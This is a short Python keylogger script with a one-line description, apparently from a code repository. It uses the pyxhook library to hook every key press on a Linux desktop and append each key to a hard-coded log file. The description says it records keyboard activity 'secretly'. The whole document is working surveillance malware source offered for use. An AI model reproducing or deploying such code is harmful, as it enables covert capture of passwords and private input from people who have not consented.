# keylogger
simple keylogger in which all you keyboard activities will be saved in a log file secretly.


import pyxhook
#change this to your log file's path
log_file='/home/wavenet/Desktop/mrinal/file.log'

#this function is called everytime a key is pressed. onekeypress is the function which execute evrytime a key i9s pressed.
def OnKeyPress(event):
  act=open(log_file,'a')
  act.write(event.Key)
  act.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`) , if grave is pressed the log file is closed and session is terminated.
    act.close()
    new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
